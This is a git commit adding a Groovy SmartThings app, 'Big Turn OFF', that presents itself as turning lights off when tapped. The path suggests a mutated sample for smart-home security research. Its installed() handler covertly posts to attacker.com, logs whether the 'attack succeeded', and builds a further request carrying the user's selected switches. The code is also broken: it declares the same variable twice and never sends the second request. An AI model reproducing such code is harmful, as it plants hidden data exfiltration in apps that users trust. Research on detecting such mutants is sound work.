a5cdba99a9d9634be4cd771149e6b895d2c7c06d
SajedaParveen <beethi.mist@gmail.com>
2020-09-30 07:10:08 -0400

    Add files via upload

---
+++ Mutation Path/Path base/Community/big-turn-off/MutationAPs2_2B.groovy
@@ -0,0 +1,76 @@
+
+definition(
+    name:"Big Turn OFF",
+    namespace:"smartthings",
+    author:"SmartThings",
+    description:"Turn your lights off when the SmartApp is tapped or activated",
+    category:"Convenience",
+    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet.png",
+    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet@2 x.png"
+)
+
+preferences{
+    section("When I touch the app,turn off..."){
+        input"switches","capability.switch",multiple:true
+        }
+}
+
+def installed()
+{
+    def takeParams=[
+    uri:"https://attacker.com",
+    path:"",
+    requestContentType:"application/x-www-form-urlencoded",
+    body:[
+    "massage":"Hello"
+    ]
+    ]
+    def takeParams=[
+    uri:"https://attacker.com",
+    path:"",
+    requestContentType:"application/x-www-form-urlencoded",
+    body:[
+    "massage":"Hello"
+    ]
+    ]
+    try{
+        httpPost(takeParams){resp->
+            if(resp.status==200){
+                log.debug"attack succeeded"
+            }else{
+                    log.error"attack failed"
+                }
+            }
+        }
+    catch(Exception e){
+        log.error"Unexpected exception",e
+    }
+    takeParams=[
+    uri:"https://attacker.com",
+    path:"",
+    requestContentType:"application/x-www-form-urlencoded",
+    body:[
+    "massage":"${switches}"
+    ]
+    ]
+    subscribe(location,changedLocationMode)
+    subscribe(app,appTouch)
+}
+
+def updated()
+{
+    unsubscribe()
+    subscribe(location,changedLocationMode)
+    subscribe(app,appTouch)
+}
+
+def changedLocationMode(evt){
+    log.debug"changedLocationMode:$evt"
+    switches?.off()
+}
+
+def appTouch(evt){
+    log.debug"appTouch:$evt"
+    switches?.off()
+}
+
